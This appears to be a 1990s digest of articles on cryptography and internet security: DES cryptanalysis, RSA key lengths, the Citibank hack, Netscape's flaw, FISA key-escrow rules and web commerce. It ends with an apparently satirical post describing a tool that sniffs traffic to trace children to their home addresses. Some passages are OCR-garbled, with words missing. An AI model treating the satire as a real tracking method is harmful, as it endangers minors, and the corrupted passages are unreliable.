mathematics and increased computing power mean you need
longer keys and stronger algorithms if you still want to
keep your secrets. Both private-key encryption (which
uses a single key for coding and decoding) and public-key
systems (which use separate keys for encryption and
decryption) are increasingly vulnerable to determined
attack. But do these weaknesses represent a real threat
to encrypted data, or are they still just intriguing
research results?
Unfortunately, when we try to assess the effectiveness of
today's popular cryptographic systems, we run into a
problem of mathematical ignorance. Most people who are
familiar with mathematics can work in two directions,
forward and backward, like the simple algebraic equation
a = b + 1. We can determine the value of the first
variable from that of the second and vice versa. Crypto
systems, however, generally rely on mathematics that
works only in one direction. People assume these systems
are secure because no one has yet shown how to work the
mathematics backward and break open the message. In
general, we determine the strength of most cryptographic
systems by seeing how well they avoid the attacks we know
have been used on other systems. If none of the past
attacks seems to work, then we deem a system secure. For
Let's look at how today's codebreakers work, the
resources and time they need, and what we require in the
way of new systems and longer keys. Recent assessments of
the strength of private-key crypto systems involve
looking for theoretical holes and measuring the time
needed for a brute-force attack. Finding the holes can be
devilishly hard, calling for deep mathematical insights.
Brute-force attacks are easier to mount if enough
computational hardware is available, but they're also
easy to defend against.
The most important development in the realm of data
encryption in recent years is Eli Biham and Adi Shamir's
differential cryptanalysis. They showed how to mount a
limited attack on today's most widely used cryptosystem,
DES (the federal Data Encryption Standard), which is also
the basis for Unix's password system.
Imagine that you had access to your victim's DES cipher
"box" (the common term for an enciphering system) with
preloaded keys. Your goal is to determine the 56-bit key,
so that you can decrypt the other messages your victim
had encrypted with the box. Biham and Shamir showed that
you could infer the hidden key if you could pass 247
messages through the box and observe what came out. This
chosen plaintext attack builds up a statistical model of
the cipher, and it needs this many plaintexts to produce
an answer with confidence.
Most intriguing, this work exposed flaws in many DES
substitutes. Because the U.S. government classified the
details behind DES's design, many assumed that there
might be a trapdoor through which the government could
eavesdrop. To circumvent these potential trapdoors, some
folks designed their own variations of DES. Most of these
new ciphers, however, fall even faster to Biham and
Shamir's mathematical machinery. FEAL-4, a faster
replacement, for example, takes only four well-chosen

DC = differential cryptanalysis
Recently, the IBM scientists who originally designed DES
revealed that they anticipated Biham and Shamir's attack
and optimized DES to resist it. Because other
nongovernment cryptographers didn't know about this
attack, they couldn't design their software to resist it.
Now the information is public, and there are new ciphers
that hold up well against these attacks. Ralph Merkle's
Khufu and Bruce Schneier's Blowfish are two private-key
ciphers that are similar to DES but resist differential
cryptography. They do this by creating new S-boxes for
each encryption, using the key to randomize them.
(S-boxes are the essential scrambling elements of
DES-like ciphers. Think of them as lookup tables or
nonlinear functions; their outputs should be as random as
possible.) Differential cryptanalysis works only if the
attacker knows what's in the S-boxes.
This work also revealed some stunning counterintuitive
results. Key length is usually taken as a rough measure
of a system's security. DES uses 56-bit keys; a
brute-force attacker might need to try all 2^56 keys to
find the right one. A longer key would mean a longer
brute-force attack. However, Biham and Shamir showed that
even if DES used longer keys, it would hardly be any
stronger against differential cryptanalysis. The
statistical model would still be solvable if DES used the
maximum of 768 bits.
Applying this knowledge to other types of ciphers is
tricky. RSA Data Security markets a proprietary algorithm
called RC-4 that accepts a variable-length key; this
algorithm is used in many products. The flexible key
length can be an advantage in some situations. For
example, the government allows general export of software
using RC-4 with a 40-bit key, but similar software using
a longer key must stay within the U.S. While we don't
know if differential cryptanalysis can be applied to RC-4
directly, because of the algorithm's proprietary nature,
the results with DES suggest that more key is not
necessarily stronger.
Men and Machines
Mathematical tools like differential cryptanalysis can be
the most powerful attack against a cipher system.
Brute-force attacks are normally a last resort, rare in
practice because cipher designers routinely use long key
lengths specifically to preclude them. But times are
changing. We're reaching a point at which a large machine
can quickly search the entire keyspace of DES. DES is
still in wide use; it' s been the commercial and
governmental standard for nearly two decades. Replacing
such standards can be a painfully slow process.
DES users should be thinking about what can be done with
off-the-shelf hardware.
Brute-force attacks simply use large machines that try
all possible passwords in parallel. It's even possible to
produce native chips that run DES. Michael Wiener of Bell
Northern Research described how to build a $1 million
machine using a pipelined DES processor that could cruise
through all possible keys in about 7 hours.
Massively parallel machines can also attack the problem.
Some of the most promismg emergmg machines distribute
small, 1-bit processors directly onto the memory chips.
Some have 1024 processors on a chip with 42 bits of
memory per processor. (Before it entered Chapter 11, Cray
Computer was building for the National Security Agency a
special Cray 3 with such processor-embedded memory.) In
1992 I designed a machine using 1 million associative
processor memory chips (standard DRAM densihes) from
Coherent Research (Syracuse, NY) that could attack all of
DES in one day. This machine could be reprogrammed to
attack other DES-like ciphers. Linden Technology (Austin,
TX) is currently exploring manufacturing new 4-Mb DRAMs
with the 1024 associative processors built onto the chip.
The effect of brute-force attacks on DES is also
important for Unix security, which stores each password
after passing it through DES 25 times. At log-in, you
type your password; it's encrypted 25 times and the
result compared against the password file. If it matches,
the system grants you access. Because the password file
doesn't contain the passwords themselves, unauthorized
users can't use the file to recover them directly. They
must use a brute-force machine. However, the brute-force
attack can be relatively successful against Unix, because
the keyspace is smaller. Most users limit their passwords
to alphabetic characters, occasionally adding numbers.
This makes searching for passwords much faster; it could
be done quite quickly with an associative-memory parallel
processor. One estimate suggests that a computer using
512 of Linden's chips could test all six-character
alphanumeric passwords in 15 minutes. Clearly. the Unix
password structure needs to be rethought in light of
today's machines and code-breaking techniques.
Because of this new vulnerability, you may want to
explore other, newer ciphers. such as Merkle's Khufu or
Schneier's Blowfish. The classified Skipjack algorithm
buried inside the U.S. government's Clipper and Capstone
encryption chips also uses S-boxes, but little is known
about their design. There's little reliable public
information about RSA Data Security's RC-4. Anyone who
uses these algorithms must be prepared to trust the wits
of the designers, because the algorithms have not
undergone the intensely thorough and long-time public
scrutiny given to DES.
Many organizations have opted to continue with DES, but
the current state of the art is triple-DES -- three
passes of the algorithm with either 112- or 168-bit keys.
This effectively guards against both brute-force and
differential analysis attacks. These users can rest
assured that, paradoxically, all the attacks focused on
DES continues to keep it strong.

Factoring in Public-Key's Future
Long thought nearly unbreakable, public-key cryptogratphy
is yielding to attack. The secret of security here is key
By Bruce Schneier
Factoring large numbers is hard but not as hard as it
used to be. This has grave implications for the
effectiveness of public key cryptocraphy, which relies on
the difficulty of factoring long keys for its security.
But how long is long enough'?
 "I shall be surprised if
anyone regularly factors numbers of size 10^80 without
special form during the present century." In 1977, Ron
Rivest said that factoring a 125-digit number would take
40 quadrillion years. In 1994, a 129-digit number was
factored. The lesson here is that making predictions is
Today, 512-bit keys are common. Factoring them, thus
destroying their security, is well within the range of
possibility for today's computing resources. A weekend-
long worm on the Internet could do it.
Computing power is measured in MIPS-years: a
million-instructions-per-second computer running for one
year, or about 3 x 10^13 instructions. A 100-MHz Pentium
is about a 50-MIPS machine; a 1600-node Intel Paragon is
about 50,000 MIPS.
In 1983, a Cray X-MP supercomputer factored a 71-digit
number in 0.1 MIPS-years, using 9.5 CPU hours. That's
expensive. Factoring the 129-digit number in 1994
required 5000 MlPS-years and used the idle time on 1600
computers around the world over an eight-month period.
Although it took longer, it was essentially free.
Those two computations used what's called the *quadratic
sieve*, but a newer, more powerful algorithm has arrived.
The *general number filed sieve* is faster than the
quadratic sieve for numbers well below 116 digits and can
factor a 512-bit number over 10 times faster -- it would
take less than a year to run on  an 1800-node Intel
And the process gets still faster. Mathematicians keep
coming up with new tricks, new optimizations, and new
techniques. A related algorithm, the special number field
sieve, can already factor numbers of a specialized form
(not generally used for cryptography) much faster. So we
can probably optimize the general number field sieve to
run that fast. For all we know, the National Security
Agency is already doing it.
The figure "MIPS Years Needed to Factor" gives the number
of MlPS-years required to factor "special" and "general"
numbers of different lengths.
How Big Is Big Enough?
The wise cryptographer is ultraconservative when choosing
key lengths for a public-key system. You must consider
the intended security, the key's expected lifetime, and
the current state of the factoring art. Now you need a
1024-bit number to get the same security you got from a
512-bit number in the early 1980s. If you want your keys
to remain secure for 20 years, 1024 bits is probably too
Consider these assumptions from the mathematicians who
factored RSA-129: We believe we could acquire 100,000
machines without superhuman or unethical efforts and
without an Internet womm or virus. Many organizations
have several thousand machines on the Net. Using their
facilities would require diplomacy but should not be
impossible. Assuming an average power of 5 MIPS and one
year elapsed time, we could reasonably embark on a
project that would require half a million MIPS-years. The
project to factor the 129-digit number harnessed an
estimated 0.03 percent of the Internet's total computing
power. A well-publicized project might be able to harness
2 percent of the world's computing power for a year.
My recommendations for public-key lengths are given in
the figure "Recommended Public-Key Key Lengths" according
to how long you require the key to be secure. There are
three key lengths given for each period -- one secure
against an individual cryptanalyst who can get his hands
on 10,000 MlPS-years, one against a major corporation
that could harness 10^7 MIPS-years, and the third secure
against a major govemment and 10^9 MIPS-years. These
figures assume that computing power will increase by a
factor of 10 every five years and that mathematical
advances will let us factor numbers at the speeds of the
special number field sieve.
Not everyone will agree with these final recommendations.
The National Institute of Standards and Technology has
mandated 512- to 1024-bit keys for its Digital Signature
Standard. PGP has a maximum RSA key length of 1280 bits.
Aljen Lenstra, the world's most successful factorer,
refuses to predict beyond 10 years. There's always the
possibility that an advance in factoring will surprise me
as well, though I tried to factor everything into my
calculations. But why trust me? I just proved my own
foolishness by making predictions.

Banks' Security Chains Failed
The Citibank case has highlighted weaknesses in corporate
security measures.
By John Mason
Could it happen to us? Banks have been soul-searching about
their security systems in response to the alleged computer
hacking fraud on Citibank, in which $10m (6.49m pounds) is
said to have been removed from client accounts by a young
Russian based in St Petersburg.
In public, banks express confidence in their computer
security. "It's a shame what happened at Citibank, but it
couldn't happen here," is a typical response.
However, some industry insiders are concerned that many banks
and other commercial organisations are still leaving
themselves dangerously open to attack by hackers. Rumours of
some banks not admitting to similar breaches only increase
The full technical picture of what allegedly happened at
Citibank is unclear. The largest US bank, unsurprisingly, is
reluctant to reveal precisely how Mr Vladimir Levin --
apparently without inside help -- allegedly breached its Wall
Street security system from his personal computer in St
Petersburg. A UK court will today decide whether to extradite
Mr Levin to the US to face trial.
It seems that Citibank was caught out by its technology, which
could not match recent developments available to hackers.
Citibank's main weakness is known to have been its use of
"fixed passwords" to guard its computerised cash management
system. This system, dubbed Citicorp Cash Manager, handles
transactions totalling $5OObn every day.
Cash management systems which provide customers with access to
their accounts so that they can make transfers, are inherently
vulnerable to hackers because by definition they allow
third-party access.
In the case of Citibank, access to the cash management system
could be made via telephone lines from anywhere in the world
using a computer. Until the incident, Citibank's system used
fixed or permanent passwords where the customer has only to
enter a name and regular password to gain entry to the system.
However, security experts now agree that this technology has
been rendered ineffective at guarding high-risk systems by the
proliferation of modem communications devices attached to
powerful PCs providing access to the Internet. Hackers now
have ready access to sophisticated software including
"sniffers" -- programs used by network managers which allow
them to look at and capture information on networks. These
give hackers access to huge quantities of information --
including directories of passwords.
The hackers can then take their pick of which password to use.
With bank cash management systems, this virtually amounts to
giving a hacker the choice of which client account to loot.
There are a number of steps banks and other security-conscious
computer network operators can take to defend themselves
against unauthorised intruders. The main option -- and that
introduced by Citibank since the Levin incident -- involves
the use of encrypted passwords that can be used only once.
A "smart card" issued to each customer contains a sequence of
passwords so that a different one is used each time. This
password is then encrypted or scrambled into a form that is,
its manufacturers claim unreadable to anyone "surfing" the
Internet. The main computer then deciphers the signal and,
able to recognise the sequence of changing passwords, lets the
genuine user into the system.
The chances of someone guessing one of Citibanks's passwords
are now one in 11m, says Mr Tom Brady of Enigma Logic of
Concord, California, which supplies this technology to
Citibank. The bank's previous fixed password technology, by
contrast, meant breaking the password system was relatively
straightforward, he says.
Concern centres on how quickly banks and others have reacted
to technological change. Although encryption technology has
been available for more than 10 years, it is only now being
generally introduced, and usually only for systems with
external access.
Barclays Bank introduced encryption for computer systems with
external access before the Citibank incident occured. Barclays
now feels "fairly comfortable" about the state of its
security, says Mr Philip Severs, deputy director of
operational risk.
However, it is clear that not every bank has closed the door
yet. Mr Severs says the business world is just "on the cusp"
of introducing encryption technology.
Another security adviser says the measures of one leading US
bank, based on both fixed and encrypted passwords, are still
considered weak by experts. Another security specialist
employed by a leading international bank says that senior
management throughout the industry has sometimes been slow to
react to change. "Sometimes people think that their security
is adequate simply because it has not been breached in the
past. At other times, head offices are warned of the dangers,
but fail to act because of cost factors."
Whatever the state of bank security, their experts agree that
their customers' awareness of the problem is lower. "Whenever
payments are made or orders placed electronically, then a
threat exists. The banks are leading on this. Companies are
some way behind," says Mr Severs.
But encryption remains only one way of improving security. The
alleged hacking incident at Citibank involved more than simply
breaching the bank's password system.
The US government claims Mr Levin was able to watch corporate
clients making numerous transactions before deciding which
account to take money from. He also allegedly spotted one
security precaution in place and limited each of his
withdrawals to under 200,000 pounds ($310,540).
Citibank will not comment on its security measures other than
to point to its "smart cards". Huwever, the bank agrees that
there was only partiai use of another well-established.
security system -- "predefined" transfer routes. These allow
customers to make transfers only to specific bank accounts
making it impossible for a hacker to remove funds for himself.
Citibank offers such an option. However, it is only useful to
some customers. The average corporate customer might find it
suitable because the number of destination accounts they need
is limited. However, for financial institutions making
transfers to many accounts, such a system is too cumbersome.
Perhaps significantly, one of Mr Levin's alleged nctims was an
investment company.
Citibank investigators say Mr Levin gave himself away by
making a number of "amateurish" mistakes, but admit he was a
very sophisticated computer operator, allegedly attempting a
particularly elegant fraud.
The bank concedes that it still does not fully understand all
the technical aspects of how Mr Levin allegedly managed to
break in. If and when he is extradited to the US and
introduced to that country's plea bargaining system, he will
be invited to explain further.
Banking security experts agree that the Citibank episode shows
that effective detection systems to track unusual transactions
remain essential. In the Citibank case these worked well,
enabling the attempted fraud to be nipped in the bud,
monitored and losses kept to $400,000.
But they agree that even if new technology is introduced,
keeping one step ahead of the hackers all the time is just not
possible. One with knowledge of the Citibank case comments:
"At the end of the day it cannot be done. Essentially,
security is about being reactive, not pro-dctive."
Meanwhile, the Citibank episode provides the most public
example yet of how hackers can threaten the integrity of the
international banking system. And just as the Barings collapse
prompted other banks to review their internal management
controls, so Mr Levin's case is having a similar effect on
computer security.
But as one bank security expert says: "It takes an incident
like this to prompt people to review their systems. Whether
they take action however is a different matter."

Netscape flaw may deal blow to Internet security
By Louise Kehoe in San Francisco
A security flaw in Netscape Communications' popular Internet
software could deal a serious blow to companies planning to
transact business on the Internet, the global computer
The flaw, discovered by two computer science students at the
University of California at Berkeley, means that financially
sensitive data, such as credit card numbers, sent over the
Internet using Netscape software could be vulnerable to
computer hackers.
"Security is the number one issue" that needs to be resolved
if the Internet is to become a medium for largescale
electronic commerce, according to Ms Cathy Medich, executive
director of CommerceNet, a consortium of companies that is
developing standards and protocols for conducting business on
the Internet with backing from the US government.
The security breach is a setback for Netscape, raising
concerns about the company's ability to produce reliable
secure software.
Netscape's so-called secure browsers are used by an estimated
66 per cent of people accessing the World Wide Web, the
segment of the Internet where thousands of companies have set
up electronic displays of their products.
The software had been seen as a breakthrough for electronic
commerce, enabling people to buy and sell goods online without
fear of their messages being intercepted.
Netscape confirmed that a security loophole has been
identified, but said it would offer a free security "patch" by
the end of this week on its World Wide Web page
No losses have been reported as a result of the security
breach, Netscape said.
This is the second time that Netscape's encryption has been
"cracked". Last month, a computer expert in France was able to
decode the weaker version of Netscape's cyphers, which the
company is allowed to export.
The security flaw found by the Berkeley students affects all
current versions of Netscape soMware, including its browsers
and server software, the company said.
However, next week the company will begin trials of a new
version of its browser, which will contain the security patch.

               AUTHORIZATION PROCEDURES
       FOR RELEASE OF ENCRYPTION KEY COMPONENTS
    IN CONJUNCTION WITH INTERCEPTS PURSUANT TO FISA
The following are the procedures for the release of
escrowed key components in conjunction with lawfully
authorized interception of communications encrypted with
a key-escrow encryption method. These procedures cover
all electronic surveillance conducted pursuant to the
Foreign Intelligence Surveillance Act (FISA), Pub. L.
95-511, which appears at Title 50, U.S. Code, Section
1801 et seq.
1)  In each case there shall be a legal authorization
    for the interception of wire and/or electronic
    communications.
2)  In the event that federal authorities discover
    during the course of any lawfully authorized
    interception that communications encrypted with a
    key-escrow encryption method are being utilized,
    they may obtain a certification from an agency
    authorized to participate in the conduct of the
    interception, or from the Attorney General of the
    United States or designee thereof.  Such
    certification shall
    (a) identify the agency participating in the conduct
        of the interception and the person providing the
        certification;
    (b) certify that necessary legal authorization has
        been obtained to conduct electronic surveillance
        regarding these communications;
    (c) specify the termination date of the period for
        which interception has been authorized;
    (d) identify by docket number or other suitable
        method of specification the source of the
        authorization;
    (e) certify that communications covered by that
        authorization are being encrypted with a
        key-escrow encryption method;
    (f) specify the identifier (ID) number of the
        key-escrow encryption chip providing such
        encryption; and
    (g) specify the serial (ID) number of the key-escrow
        decryption device that will be used by the
        agency participating in the conduct of the
        interception for decryption of the intercepted
        communications.
4)  This certification shall be submitted to each of the
    designated key component escrow agents.  If the
    certification has been provided by an agency
    authorized to participate in the conduct of the
    interception, a copy shall be provided to the
    Department of Justice, Office of Intelligence Policy
    and Review.  As soon as possible, an attorney
    associated with that office shall provide each of
    the key component escrow agents with written
    confirmation of the certification.
5)  Upon receiving the certification, each key component
    escrow agent shall release the necessary key
    component to the agency participating in the conduct
    of the interception.  The key components shall be
    provided in a manner that assures they cannot be
    used other than in conjunction with the lawfully
    authorized electronic surveillance for which they
    were requested.
6)  Each of the key component escrow agents shall retain
    a copy of the certification, as well as the
    subsequent written confirmation of the Department of
    Justice, Office of Intelligence Policy and Review.
7)  Upon, or prior to, completion of the electronic
    surveillance phase of the investigation, the ability
    of the agency participating in the conduct of the
    interception to decrypt intercepted communications
    shall terminate, and such agency may not retain the
    key components.
8)  The Department of Justice shall, in each such case,
    (a) ascertain the existence of authorizations for
        electronic surveillance in cases for which
        escrowed key components have been released;
    (b) ascertain that key components for a particular
        key-escrow encryption chip are being used only
        by an agency authorized to participate in the
        conduct of the interception of communications
        encrypted with that chip; and
    (c) ascertain that, no later than the completion of
        the electronic surveillance phase of the
        investigation, the ability of the agency
        participating in the conduct of the interception
        to decrypt intercepted communications is
        terminated.
9) Reports to the House Permanent Select Committee on
    Intelligence and the Senate Select Committee on        Intelligence, pursuant to Section 108 of FISA,
    shall, with respect to any order for authorized
    electronic surveillance for which escrowed
    encryption components were released and used for
    decryption, specifically note that fact.
These procedures do not create, and are not intended to
create, any substantive rights for individuals
intercepted through electronic surveillance, and
noncompliance with these procedures shall not provide the
basis for any motion to suppress or other objection to
the introduction of electronic surveillance evidence
lawfully acquired.

How the Propeller Heads Stole the Electronic Future
The silver-haired media monopolists follow their 500-
channel dream. They haven't reckoned with the 500 million
channels of Netscape and the Internet.
By Steven Levy.
If you want an arbitrary date for the burial of the
500-channel dream, Aug. 9, 1995, will do just fine. On
that morning, the public had its first crack at buying
stock in the year-old Netscape Commumcations Corporation,
which makes software that helps people navigate the
Internet and set up "sites" that Net surfers can visit.
What happened next is already the stuff of high-tech
legend. The offering price of $28 per share shot up
within minutes to a vertiginous $75 until finally
settling at $58, a price that valued the
as-yet-profitless company at well over $2 billion. A
month later, it was trading at about $53.
The initial news reports focused on the instant
millionaires at Netscape, including a 24-year-old
computer programmer, Marc Andreessen, who emerged from
the stock offering with that all-important first $58
million. But the real significance of the event was not
that another bunch of propeller heads had joined the
ranks of the super-rich. Aug. 9 marked the moment when
Wall Street finally realized what had been becoming
increasingly apparent to computer users: a set of highly
technical but reliably standardized communications
protocols known as the Internet had established itself as
the real key to the electronic future. That future would
be made not by silver-haired telephone- and cable-company
executives in Denver, New York and Washington, building
an empire around a golden goose called pay-per-view
television, but by companies like Netscape and their
In short, the end of the 500-channel dream. This was a
myth constructed by the masters of the media, people like
John Malone of Tele-Communications Inc. (T.C.I.), Ray
Smith of Bell Atlantic and Sumner Redstone of Viacom.
They believed that the television set would extend its
domain from the center of the entertainment universe to
the worlds of commerce and information. Despite their
promises that the new era of digital media would be
marked by increased competition, they assumed that their
companies would keep their hands on the valves of a
limited information pipeline. But for consumers, the
dream offered only two differences, really, between what
the public has now and what will be available in the
*The same programming but more of it*. Instead of getting
50 or 60 alternatives when you plopped down in front of
the tube, you'd get a lot more. Five hundred was the
number that stuck in people's minds.
*So-called interactive programming*. The interactivity
comes in makng choices: pressing buttons to choose
programs and, above all, to buy things. The living-room
television would be a cash register of sorts, enabling
Dad, Mom, Junior, Sis and probably even the faithful dog
Astro to buy more programming -- and buy more everything,
from pizzas to Dustbusters.
The operators of those systems, like T.C.I. and Time
Warner, would act as gatekeepers, deciding which
entertainment channels, pay-per-view events, banks,
retailers, publications and data bases would reach
consumers. There were tremendous opportunities to make
money, not only from monthly fees and pay-per-view
charges but also from percentages of every transaction.
And then there was the wealth of information about
consumer buying habits generated by the aggregation of
buying choices made by pressing those buttons. This, too,
would be sold and bartered.
For the past few months the silver-haired guys have been
arranging expensive technology tests in places like
Orlando, Fla. They have been wooing Congress for
favorable regulations. They have been frantically merging
and making alliances. But meanwhile, a different vision
of the media future has begun to form -- totally under
their radar. It moved from the academic and scientific
communities, then to the business world, then to
politics. As it grew and grew, it suddenly became clear
that this new vision had the potential to pull the plug
on the 500-channel dream.
This is the Internet and its most interesting subset, the
World Wide Web. It is based on unlimited channels of
communication, community building, electronic commerce
and a full-blown version of interactivity that blurs the
line between provider and consumer. You don't need an
Arthur Andersen report or even a cyberpunk science
fiction novel to envision how this new model of the
future will work. Millions are already participating in
it. Its nascent form -- albeit with often sluggish
performance and frequent system crashes -- has spread
like digital wildfire.
In short, the information superhighway, font of a
thousand bad metaphors, is already here. But it's not
about sitting on a couch and pressing a button to order
"Dumb and Dumber." It's about Web surfing, open systems
and freedom.
Why did the stock market go bonkers for Netscape, a
year-old company that not only operated deep in the red
but also warned in its prospectus that it did not intend
to make any profits "in the foreseeable future?" Only one
reason: the Internet
If the 500 channel dream on the TV screen is the old
future, the new one is the Internet on the computer
screen. Think of it as a combination book, radio,
magazine, mailbox, conversation parlor, bulletin board,
billboard and, one day, television set. Install what is
known as a browser program -- the most popular is
Netscape's Navigator -- and you're cruising the World
Wide Web. Your screen is a selection of signed baseballs
up for auction, a tour of the Louvre, a zine (a
self-published magazine) on the life of a teen-age girl
in Canada, a multimedia repository of General Electric's
public relations documents, the complete text of the
Congressional Record. Millions of possibilities await
you, and getting to them is easy. Anything can be wired
to anything else on this World Wide Web (thus the name)
by moving the cursor to a highlighted word or image with
an embedded link to another location.
Web travelers do not just travel by links, of course --
they can go directly to any Web site. The interesting
thing about the sites is their equality. Like phone
numbers, or addresses on letters, these addresses have no
favored positions; in terms of gaining access to homes,
ABC, Disney and Sears have no inherent advantage over
Joe's Video or the corner pizza parlor. (For help in
knowing what's available, people are already adopting the
first of a new breed of electronic guide services, like
the popular Yahoo Web site, a sort of Baedeker's of the
At first, Web traveling seems like a fascinating but
perhaps frivolous diversion. But then you consider the
next step -- commerce. Secure creditcard transactions are
already possible, the ability to charge for time spent on
a link is currently being implemented and companies like
Visa, Mastercard and newer entities with names like
Cybercash and Digicash (and, yes, Microsoft) are
concocting Net-based technologies that work just like
cash. And then you begin to realize why some farsighted
people in the media industries are terrified of the World
Wide Web. Every home is potentially a video conferencing
center, every independent film maker is potentially a
widespread broadcaster, every business is potentially a
global marketer. A single twisted idea and a rudimentary
sense of layout can transform a voiceless outcast into a
cult publisher. Now that's interactivity.
The 500-cable-channel tests are just the beginning of a
long process. The Net, meanwhile, has millions of people
on it, now. It will take a decade or so to upgrade the
Net to carry high-quality video services, but most
everything else is feasible now and better suited to the
desktop than to the TV room. You can't easily read a
newsletter or a bank balance on a television set that's
20 feet away. So by the time the cable and telephone
companies get their systems in order, millions of
Americans will be riding the I-way from their dens and
offices, not their living rooms. Sure, eventually the
electronics of computers and televisions will be
indistinguishable, but by then the road to information
nilvana will have been laid -- and the ethos will be that
of the Internet.
In that ethos, the people who provide you the pipes to
move information have no say in what content moves
through those pipes. They collect no information on their
consumers' buying habits, and they certainly do not get
a piece of the transactions that occur over their wires.
The guys in the middle -- those with the 500-channel
dream -- will thus be cut out of the best part of the
The masters of the media have taken notice, and lately
they've been hedging their bets. Still, they have yet to
grasp that the Internet can never be merely another
profit center in their dreams of empire. Their power is
based on monopoly, on controlling distribution. But the
Net is built to smash monopolies. Instead of a
gatekeeper, users get an open invitation to the
electronic world and can choose whatever they want. "If
there is a market for 500 channels," says James
Barksdale, Netscape's president, "imagine the market for
5 million, 50 million, 500 million!"
Now, this new vision doesn't portend poverty for the
media masters. There's still a place for movie studios,
television producers and music publishers -- the Disneys
of the world -- in this new, content-driven universe. The
phone companies will provide Internet access to the
masses. And the couch-potato style of television will
probably always be with us.
But it won't be business as usual for the media masters.
It's entirely possible that beginning novelists,
musicians and even film makers will choose to distribute
through the Web. And it's almost inevitable that one day
soon, a John Grisham, an R.E.M. or a Roseanne will grasp
the advantages of ditching the media company and selling
directly to the consumer.
A year ago, people were buzzing about the proposed (and
eventually aborted) marriage of Bell Atlantic and T.C.I.
Now people are talking about Disney and Cap Cities, CBS
and Westinghouse, and Ted Turner and some other
television network. But if the World Wide Web shatters
the current paradigm of distribution, the channel
capabilities of cable systems and even networks will be
severely devalued. Anyone will be able to set up a new
channel or storefront on the virtual highway, for free,
asking permission of no one and accepting income directly
over the wire.
This is why John Perry Barlow, co-founder of the
Electronic Frontier Foundation, calls the current vave of
media realliances "the rearrangement of deck chairs on
the Titanic."
The iceberg, of course, is the Internet.

Call for White Papers
     Information Technology Security Policy Setting Process
                          issued by the
                   Cross-Industry Working Team
                  Thursday, September 28, 1995
The Cross-Industry Working Team (XIWT) is seeking inputs from industry on ways to improve the process by which public policy information technology  systems security is developed. At the
invitation of the Information Infrastructure Task Force (IITF) the U.S. government, XIWT is soliciting ideas broadly from US
industry, in the form of White Papers that address this issue. will, later this year, convene a workshop of industry experts organize the ideas and suggestions expressed in these White into a report for use by the IITF, and will prepare a report to made available to the public.
XIWT is a multi-industry coalition of organizations committed defining the architecture and key technical requirements for a
powerful and sustainable national information infrastructure XIWT aims to foster the understanding, development and of technologies that cross industry boundaries; facilitate the
conversion of the NII vision into real-world implementations, facilitate a dialogue among representatives of stakeholders in private and public sector. Additional information about XIWT can be
found on the Internet at: Information Technology Systems Security
In the developing National Information Infrastructure (NII),
information technology will be deployed in a wide range of and systems including communications, computing, software and many different types of applications. The ability of this
technology, and the systems which employ it, to provide the
requisite levels of security and protection, are of concern to
almost everyone.
Issues of central concern include: physical protection of and their contents, potential vulnerabilities at various points
within the networked environments of these systems, and the to provide or even guarantee reliable and/or uninterruptable
service. The infrastructure for such capabilities will need to
include mechanisms for the protection of networks, computers other types of equipment as well as systems that employ these
elements, as well as methods for analysis, certification and
validation of technology and systems, and for facilitating the
setting of standards. It is likely that cryptographic will need to be available throughout for possible use in and authentication of information. Issues involving the of  these capabilities will need to be uncovered, discussed and
resolved where possible. At present, the federal government has formal process in place, in the Congress or in Executive Branch
agencies, which adequately involves the private sector in the
determination of public policy in this area.
Responsibilities for this broad area within the federal are widely diffused and do not necessarily insure that all the
relevant concerns of the private sector are taken into account.
Further, no single process is used by the various parts of the
federal government and a variety of policies, reflected in regulation and practice, usually result. A methodology is by which private sector interests can be adequately expressed factored into resulting policies. The purpose of this call for
white papers is to request written inputs from interested and
knowledgable parties on how the formal process to developing
information technology systems security policies may be and particularly on how private sector inputs can be most
effectively incorporated.
Specifically, industry is requested to identify those areas,
domains, and issues that are especially relevant for and to recommend specific suggestions or approaches by which policy determination process in these areas may be improved. may entail, for example,  the establishment of one or more dedicated to this purpose, within or across domains; the of a broad set of principles for the government or other bodies employ; the setting of national goals or other specific
recommendations for federal action.
White papers are specifically solicited from U.S. industry; individuals who wish to contribute are welcome to do so.
Submissions may be made on paper or electronically by sending
electronic mail, document files, or via a form located on the World Wide Web server (addresses below). Submissions made on of companies will be taken to represent the views of the firm;
these will be verified if it is not made clear in the that the document represents a company position. Individual
submissions will not be verified if they do not claim to company positions.
Submissions should be: 1) responsive to the primary goal of call, (focused specifically on process improvement and not the
presentation of  view on policy deficiencies or on desired
policies); 2) clear in terms of specific topics, areas or of policy; 3) reasonably direct, brief and timely.
Any format may be used for the white paper, and it may be of length. However, submissions must include the following
information, on envelopes or headers to email and web messages, on the submission document, whatever its form:
1.   The name of individual making the submission;
2.   The name of firm on whose behalf the submission is made;
3.   The return address by which submission may be verified, if
     necessary.
XIWT will convene a one or two day  invitational workshop in Washington DC area in December, 1995, to review submissions and
organize the preparation of findings. Papers received by 15, 1995, will be used in the workshop.  The report of this is intended to be made available in February, 1996.

users are already barred from newsgroups containing 'undesirable'
material such as government human rights violations and pornography.
"This is the latest move to try to control the Internet," says TIME's
Beijing Bureau Chief, Jaime Florcruz. "It dawned on the Chinese
government that new ideas from overseas were leaking into the psyche
of the Chinese people. It's still unclear how they will block the flow
 of information, especially when the government has such need for it,
itself. Its a losing battle, especially in the provinces. If the Party
cadres there want Internet access, or satellite TV, Beijing will have
a hard time curbing them."

@_subject: GNU Version 0.01 (alpha) of KiddieFind is now available 
I am going ahead and releasing an alpha version of KiddieFind a free
Unix implementation of LolitaWatch.  Everything is under the GPL, so
the source code is free, hack on it all you want ...
KiddieFind is an enhanced free version of Nubility Inc.'s LolitaWatch
for Unix.  It works by locating network packets that have the US
federally mandated Under18 bit set, and then uses publicly accessible
databases to map them into a street address and phonenumber.
The networked version works as follows, using the provided plug in
module (a version is provided in 0.01 for AOL, I'm working on a
CompuServe version and will have it ready in a week or so) to connect
to a major online service.  Once connected it goes into the equivalent
of promiscuous mode and scans all traffic for the age bit, and
forwards the information back to your system.
After collecting all this information, it scans a number of publicly
accessible databases to turn the information into a street address.
The geographical location can be approximated by running a traceroute
on the IP address of the originating packet and works backwards until
a host with reliable geographic data can be located.  KiddieFind only
requires state-wide granularity, and this only to narrow the later
phonebook search.
Once a geographic location has been determined, it's not likely that
the child has her own phone.  Therefore the parents must be found.  A
search is done through the any number of the available on-line
telephone books.  By this stage KiddieFind should have a manageable
number of candidate numbers.  If real names are being used, than it's
easy to isolate the correct phone number.  Hopefully the Denning
geographic information will be mandated soon, thus eliminating nearly
all sources of error isolating the correct neighborhood.
If there are still too many candiate numbers a number of other mostly
automated searches can be done.  The parents' home web pages can be
searched for personal information, etc.
